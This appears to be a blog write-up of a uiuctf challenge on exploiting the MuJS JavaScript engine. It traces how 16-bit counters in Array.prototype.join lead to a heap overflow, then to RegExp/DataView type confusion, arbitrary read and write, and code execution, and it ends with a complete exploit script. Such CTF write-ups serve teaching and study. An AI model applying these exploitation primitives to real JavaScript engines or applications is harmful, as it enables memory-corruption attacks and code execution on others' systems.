---
layout: post
title: "Attacking MuJS: Breaking a JS engine with type confusion and an integer overflow."
description: "Writeup to uiuctf's mujs challenge, a javascript pwn challenge were you must pwn the MuJS javascript engine to achieve arbitrary read, write, and code execution."
tags: [ctf]

---

## Introduction

This weekend, I played [uiuctf](http://uiuc.tf/) with DiceGang. Although all of the pwn was splendid, one did really stick out to me, and that was mujs. mujs relied on [MuJS Javascript engine](https://mujs.com/), which I have never worked with before. Although I am very unfamiliar with javascript pwn, I must give props to Sam Sharps, the author of this challenge, for the the installations scripts and templates as well as the informative README.md which made this challenge a whole lot easier to setup and begin bug hunting.

As a side note, thank you [jiwuko](https://www.instagram.com/jiwuko/) for making the drawings in this writeup.

## The Goal

Usually, when doing a JS pwn challenge, you've got to somehow get a shell. But uiuctf wasn't going to make it that easy! We had to implement 3 different primitives to get the flag. In addition, all 3 primitives needed to work across platforms.

- read32, to read from any address
- write32, to write to any address
- execute, to execute any address

Dang, this is looking like kind of a tall order. But that's alright! We can tackle creating each primitive individually, each primitive building on the last. But, of course, if we want to have any hope of implementing these primitives, we are going to need to find the bug first.

## The Bug

Finding the bug was really really simple! The README.md told you that the bug was in a function called `Ap_join` in `jsarray.c`.  `Ap_join` is the function handler for `Array.prototype.join`. For reference, `.join` has the following result:

```javascript
['a', 'bb', 'ccc'].join('-')
// a-bb-ccc
```

The first thing I did was `git diff HEAD` to see what changes the authors made in this file. This way, the vulns would be a lot easier to find!

But... there was only one change...?

```diff
--- a/jsarray.c
+++ b/jsarray.c
@@ -1,6 +1,7 @@
 #include "jsi.h"
 #include "jsvalue.h"
 #include "jsbuiltin.h"
+#include <stdint.h>

 int js_getlength(js_State *J, int idx)
 {
@@ -91,8 +92,10 @@ static void Ap_join(js_State *J)
        const char *sep;
        const char *r;
        int seplen;
-       int k, n, len;
+       uint16_t k, n, len; 
```

So, it seems that the variables `k`, `n`, and `len` have all been squished from 32 bits to 16 bits. It's also unsigned, so this means these values can't become negative no matter how large they get. This raises the question, "How does the change in the maximum capacity of these 3 variables lead to undefined behavior"? Well, in order to answer that question, let's consider what we know about the maximum capacity of integers that might help us exploit the small capacity of these 16 bit integers.

**When an integer tries to hold a value that is too big for it's intended size, it'll only store the amount of bits it was designed to hold from that value**. For example, when reading a 64 bit integer, a 32 bit integer will only store the first 32 bits.

This is known as an __integer overflow__. Remember this! It'll serve us well. As a tiny demo, I want you to predict what will happen if we added one to a 16 bit integer holding the maximum value that can be represented by 16 bits.

```c
uint16_t a = 0xffff;
++a;
// what will a equal?
```

Go ahead! Try it. It'll help you build an intuition for integer overflows.

Now that you've tried, you'll realize `a` will have dropped to 0. Why though? Well, let's reason why by looking at the binary.

```c
// a = 0b1111111111111111
uint16_t a = 0xffff;
// a = 0b10000000000000000
++a;
// remember! a will only take the first 16 bits, which are all 0. so, a = 0.
```

Going back to our `.join` code,  if we can find a place where a sudden drop in value due to an integer overflow would cause undefined behaviour, we could exploit that! So, let's track variable usage of `k`, `n`, and `len` to see if we can cause any of these variables to overflow. This for loop is the most important code, which creates the string to be returned from `.join`. Please look over it carefully! I've added comments to make it more easy to understand.

```c
// n is the current length of our result of the function. it starts off at 1 because an empty string has nothing except 1 null byte
n = 1;
for (k = 0; k < len; ++k) {
  // get the kth element in the array we are joining
  js_getindex(J, 0, k);
  if (js_isundefined(J, -1) || js_isnull(J, -1))
    r = "";
  else
    // r = array[k].toString()
    r = js_tostring(J, -1);
  n += strlen(r);

  // if this is the first iteration, we don't want to add the seperator of join like usual
  if (k == 0) {
    out = js_malloc(J, n);
    strcpy(out, r);
  } else {
    n += seplen;
    out = js_realloc(J, out, n);
    strcat(out, sep);
    strcat(out, r);
  }
  js_pop(J, 1);
}
```

Woah, that's a lot of code! Don't worry, we can break it down, piece by piece. First, let's try to find out what each variable is used for. Clearly, `k` is used as the iterator counter, so overflowing it wouldn't do much besides reset the loop. How about `len`? Well, `len` represents the length of the array we are calling. `len` is used as the upper bound of the loop, so making the array longer than the maximum value of a 16 bit unsigned integer would just cause the upper bound to shrink, which isn't very helpful.

`n`, on the other hand, could be very useful. `n` represents the current length of the result of `.join`. I want you to really focus on the following code. For context, `r` is equal to the current element of the array we are joining.

```c
n += strlen(r);
if (k == 0) {
  out = js_malloc(J, n);
  strcpy(out, r);
} else {
  n += seplen;
  out = js_realloc(J, out, n);
  strcat(out, sep);
  strcat(out, r);
}
```

These couple lines will be the holy grail of our exploit. But before I tell you why, I want you to try to see why an overflow in `n` will allow us to cause undefined behavior! As a clue, note that `r` can be made as long as we want, even longer than the maximum size of a 16 bit integer. For now, let's just consider the code when `k`, the iterator counter, is 0. We will discuss the else case in a bit.

Did you see it? That's right! If and only if `n` overflows, there will be a discrepancy between the size of the data and the size of the allocation for the data. Didn't get it? That's alright, I didn't spot it right away either. Either way, let's consider what might happen if the length of `r` happens to cause `n` to overflow.

First, let's take a look at the first line. Here, we see that the string length of `r`, the current element that is being joined, is added to `n`. Notice that `strlen` returns a `size_t`! A `size_t` is as big as the size of the architecture, so it would be 32 bits on a 32 bit architecture and 64 bit on a 64 bit architecture. Unfortunately for the program, `n` is a 16 bit integer, so `n` will only take the first 16 bits of the result of `strlen`. The first 16 bits of the length of `r` is completely different than the length of `r`, but the first 16 bits is used as the allocation size! Now the bug is obvious. In case it isn't, here's an example.

```c
// let's say r = 'A' * 0xffff
// n starts off as 1

// 1 + 0xffff is 0x10000!
// n is a 16 bit integer, so it'll only read the first 16 bits, so n = 0.
n += strlen(r);
if (k == 0) {
  // we allocate 0 bytes to hold r 
  out = js_malloc(J, n);
  // we copy r to an allocation sized for 0 bytes! that's the bug! that's a heap overflow!
  strcpy(out, r);
```

![](https://i.imgur.com/8fglQzT.png)

*`n` taking only the first 16 bits.*

Of course, this is an unrefined version of the bug. In an optimal case, we'd like this bug to allow us to choose two things:

- We want to control exactly how many bytes will be allocated, so we can choose which region of the heap will be used to service this allocation (more on this later). Just know for now, if we want two objects in memory to be adjacent to one another, we need their size to be very similar if not the same. This'll be important for choosing what objects we want to overflow in memory.
- We also want to control exactly how much we will overflow by, so we can selectively change different values on the heap without changing ones we don't want to change.

So, how do we do both of these things? Well, if we only have one element in the array, it's impossible. Before I tell you why it's impossible, try to figure it out yourself. I'll tell you why after you try it yourself.

This is because the only time we will ever get a heap overflow is if the length of `r` overflows `n`. But in order to get this integer overflow, `r` needs to be the maximum size of a 16 bit integer so it overflows `n`, meaning if we want an overflow, we can't really control the length of `r`. However, if we use two elements, we can do this.

Found a solution? Instead of explaining this in words, I'll let the code do the talking first.

```javascript
let allocation_size = 0x8
let overflow_content = 'OVERFLOWCONTENT!'
['A' * (0x10000 - (overflow_content.length - allocation_size)), overflow_content].join('');
```

Although this looks a little weird, i'll make more sense if I show you the C that's running the the background.

For the first element:

```c
// n will be 0xfff8, using our formula
n += strlen(r);
// k, iterator counter, will be 0 for the first element
if (k == 0) {
  // allocate a chunk of 0xfff7 since n starts off as 1
  out = js_malloc(J, n);
  // safely copy r to this chunk
  strcpy(out, r);
}
```

No bug exploitation for the first element, but that changes for the second element.

```c
// 0xfff8 + 16 = 0x10008, but n will take the first 16 bits so n = 8
n += strlen(r);

// k is not 0 so we go to else case
if (k == 0) {
  out = js_malloc(J, n);
  strcpy(out, r);
} else {
  // sep length is 0
  n += seplen;
  // realloc copies contents, so chunk is full
  out = js_realloc(J, out, n);
  // sep is our seperator, which is '', so no change
  strcat(out, sep);
  // append r to end of chunk
  strcat(out, r);
}
```

Interesting, right? The program never expects the reallocation to be smaller than the previous allocation, so `strcat` will append to the end of the chunk. The trick to getting a user sized overflow is to make the size of `n` just big enough in the first element so that the second element actually causes the integer overflow. Now that we have our heap overflow, how can we abuse it to get any primitives?

## Type Confusion 101

Me and my team tried several ideas to turn this heap overflow into primitives. We kept running into the issue that our exploit needed to be cross platform and preferably leakless. We tried assembling fake objects and attacking the custom allocator, but all of those required leaks. Then, we decided to look at what an object in MuJS is structured like in memory so we could possibly change important values with our heap overflow. That lead to us finding a javascript exploitation tactic know as "type confusion".

Now, before we actually get into type confusion, let's look at the structure for an object in memory. It'll let us know what we can change!

```c
struct js_Object
{
	enum js_Class type;
	int extensible;
	js_Property *properties;
	int count; /* number of properties, for array sparseness check */
	js_Object *prototype;
	union {
		int boolean;
		double number;
		struct {
			const char *string;
			int length;
		} s;
		struct {
			int length;
    ...
    // and several other possible structures of this union i've emitted for readability
    struct {
      uint32_t length;
    	uint8_t* data;
  	} dataview;
	} u;
	js_Object *gcnext; /* allocation list */
	js_Object *gcroot; /* scan list */
	int gcmark;
};
```

Our heap overflow can't contain null bytes, since Javascript doesn't allow null bytes in strings. This effectively prevents us from changing anything that's not the first member of this structure. But that's alright! The first member is something called `type` and is a variant of an enum.. maybe we can change that?

Taking a look at the `js_Class` enum, it becomes clear what exactly this `type` variable does. Take a look for yourself.

```c
enum js_Class {
	JS_COBJECT,
	JS_CARRAY,
	JS_CFUNCTION,
	JS_CSCRIPT, /* function created from global code */
	JS_CEVAL, /* function created from eval code */
	JS_CCFUNCTION, /* built-in function */
	JS_CERROR,
	JS_CBOOLEAN,
	JS_CNUMBER,
	JS_CSTRING,
	JS_CREGEXP,
	JS_CDATE,
	JS_CMATH,
	JS_CJSON,
	JS_CARGUMENTS,
	JS_CITERATOR,
	JS_CUSERDATA,
	JS_CDATAVIEW,
};
```

Everything in MuJS that isn't a primitive data type is a `js_Object`! And this type variable tells the program exactly what type of object it is. This gave me many ideas.

Taking a couple of notes here, there seems to be an union called `u` in `js_Object`. I encourage you to check out the source code yourself to see the full defintion of this union, but if you can't, that's fine. This `u` union seems to contain the type specific data for the object. For example, a string, this union will contain a pointer to the string and the length of the string, but if this object were a function, it would contain a pointer to the function and the name of the function. Keep in mind all members of a union will occupy the same space in memory, so if we managed to change the type of the object, data in the union would be treated differently than intended.

For example, what would happen if a string suddenly changed into a function? Well, the address for the string would be interepreted as a pointer to a function. Likewise, if a function suddenly became a string, the pointer to the function would be interpreted as a string. As you can see, this could be very powerful.

For my exploit, I decided to change a Regexp object into a DataView object. Before I discuss why I chose these two objects specifcally, let me show you what a Regexp and DataView object is.

A Regexp object is just a regular expression in Javascript. It need not any introductions, but you should know it's memory structure since it'll be useful when we change it to a DataView.

```c
struct js_Regexp
{
	void *prog;
	char *source;
	unsigned short flags;
	unsigned short last;
};
```

The relevant property here is the `source`. `source` is the regular expression string, which we can control. The fact we can control it is very useful, so keep that in mind.

Now let's look at DataView. DataView was added by the author and essentially is a C array but for Javascript.

```c
struct {
  uint32_t length;
  uint8_t* data;
} dataview;
```

The length denotes the length of the C-like array and data is a pointer to the array. If a Regexp suddenly became a DataView, how would it's data in the union, like `source` and `prog`, be interpreted as a DataView? Think about it.

Well, since this is a union, `prog` would go where `length` is, and `source` would go where `data` is. `prog` is just some pointer, but if it were interpreted as the length of an array, then the length of the array would be absolutely massive! And remember that `source` is a pointer to a user controlled string, so we can essentially treat this string like a super long array if the Regexp became a DataView!

As a proof of concept, let's try writing out of bounds.

```javascript
let vicitm = RegExp('/AAAA/ig');
// insert code to change victim type here
// use the setUint8 function from dataview
victim.su8 = DataView.prototype.setUint8;
// write 0xff 0x30 bytes after the 'AAAA' string
victim.su8(0x30, 0xff);
```

`DataView.prototype.setUint8` has a check to ensure the object calling it is a DataView, but if we change the type using our overflow, we can *confuse* `setUint8`!

![](https://i.imgur.com/g6BerGx.png)

*RegExp tricks `setUint8` into believing it's a DataView through type confusion*

By the way, the heap grows from higher addresses to lower addresses like the stack does with the included memory allocator, so `victim` would be at a lower address than the `.join` result, meaning we can overflow `victim`'s type.

Since we can set any value in this "array", we have an out of bounds read and write. It's not perfect though, because we can't read and write anywhere in memory just yet. Though, and out of bounds write is a significantly more powerful primitive than a heap overflow and will allow use to setup for a arbitrary read and write.

### OOB to Arbitrary R/W

If we allocate a DataView right after the RegExp `source` string, we can overwrite properties of the DataView. The main property we want to overwrite is `data`, since that'll contain a pointer to the C-like array. We can use the RegExp to move the C-like array pointer in the adjacent DataView and make it point to wherever we want! From there, we can use the DataView with the changed pointer to do read and writes.

So, the RegExp object will use the OOB to overwrite the DataView pointer, while the DataView will actually read and write to the pointer. The RegExp object tells the DataView object *where* to go, while the DataView object does the actual read/write. 

![](https://i.imgur.com/xqP7lWE.png)

*RegExp controlling where DataView goes, while DataView does the work.*

Hopefully you've got that hammered into your head now, but if not, here's an example!

```javascript
let worker = DataView(8);
// make source string long enough so that it gets allocated above worker
let vicitm = RegExp('/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ig');
// insert code to change victim type here
// use the setUint32 function from dataview
victim.su32 = DataView.prototype.setUint32;

// write lower 32 bits to the data ptr of worker
victim.su32(offset_to_worker_data_ptr, 0xdeadbeef % 0x100000000);
// write upper 32 bits to the data ptr of worker
victim.su32(offset_to_worker_data_ptr + 4, 0xdeadbeef / 0x100000000);

// read 32 bits from 0xdeadbeef, segfault!
worker.getUint32(0);
```

Now that we have arbitrary read and write, we need to get arbitrary code execution.

### Arbitrary R/W to ACE

Now that we have arbitrary read and write, the heap is our oyster. Getting code execution is fairly easy from here! We just need to do a little more type confusion. For my implementation of ACE, I changed the type of a regular object to that of a CFunction, a type for built in C functions for JS. Ok, ok, you technically don't need arbitrary read and write to pull this off. In fact, the out of bounds of write is plenty to change the type of the regular object and write the address of the function to be executed. Here's my code to do this.

```javascript
var bad_fn = {};
let worker = DataView(8);
// make source string long enough so that it gets allocated above worker
let vicitm = RegExp('/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ig');
// insert code to change victim type here
// use the setUint32 function from dataview
victim.su32 = DataView.prototype.setUint32;

// write to type of bad_fn to make it a CFunction
victim.su32(offset_to_bad_fn, 5);

// write lower 32 bits to the function ptr of CFunction
victim.su32(offset_to_bad_fn + 0x40, 0xdeadbeef % 0x100000000);
// write higher 32 bits to the function ptr of CFunction
victim.su32(offset_to_bad_fn + 0x40 + 4, 0xdeadbeef / 0x100000000);

// 0xdeadbeef is called. segfault!
bad_fn();
```

Now we have all three requirements!

## Recap & Final Exploit

The path from an integer overflow to arbitrary code execution was certainly not a straightforward one. Let's go over how we got here.

- Using the integer overflow, we caused the chunk size to shrink, allowing us to use `strcat` to append content to the end of the chunk, giving us a heap overflow.
- Using the heap overflow, we overwrote the the type variable of a RegExp, converting it into a DataView. Because a pointer occupied the space where the length of the DataView array would usually be, we got an out of bounds write on the regular expression string.
- Using the out of bounds write, we controlled the pointer of a regular DataView, allowing us to read and write anywhere in memory.
- Also using the out of bounds write, we overwrite the type of an object, converting it into a CFunction. We also wrote the address of the function we want to execute to the function pointer in the CFunction union.

Ok, enough talking. Let's see the exploit!

```js
// as a note, mujs supports only legacy javascript, so somethings aren't as efficient as i'd like them to be.
function read32(address) {
  	// 0x128 is the offset to the worker's data ptr. overwrite the data ptr with the address.
    victim.su32(0x128, address % 0x100000000);
    victim.su32(0x128 + 4, address / 0x100000000);
    return worker.getUint32(0);
}

function write32(address, value) {
    victim.su32(0x128, address % 0x100000000);
    victim.su32(0x128 + 4, address / 0x100000000);
    worker.setUint32(0, value);
}

function execute(address) {
  	// 0x1a8 is the offset to the bad_fn's function pointer. overwrite it with the address to exec
    victim.su32(0x1a8, address % 0x100000000);
    victim.su32(0x1a8 + 4, address / 0x100000000);
  	// call the function pointer
    bad_fn();
}

// this code makes a 0x10000 long string of just Xs.
var overflow = "X";
for (var i = 0; i < 16; ++i) {
    overflow = overflow + overflow;
}

// our heap overflow content to overwrite the type of victim
overflow_content = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x11"
var dv_overwrite = [overflow.slice(overflow_content.length - 50), overflow_content];

var bad_fn = {};
var worker = DataView(8);

// make the regular expression string long enough so that it gets allocated under the result of dv_overwrite.join
var victim = RegExp('/RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR/ig');

// overwrite victim type
dv_overwrite.join('');
// give victim dataview functions
victim.su32 = DataView.prototype.setUint32;
victim.su8 = DataView.prototype.setUint8;

write32(Challenge.write(), read32(Challenge.read()));

// overwrite the type of bad_fn to make it a CFunction
victim.su8(0x180, 5);

// call the code to fetch the flag
execute(Challenge.exec());

// get the flag!
var flag = Challenge.getFlag();
print(flag);
```

Thanks for reading!



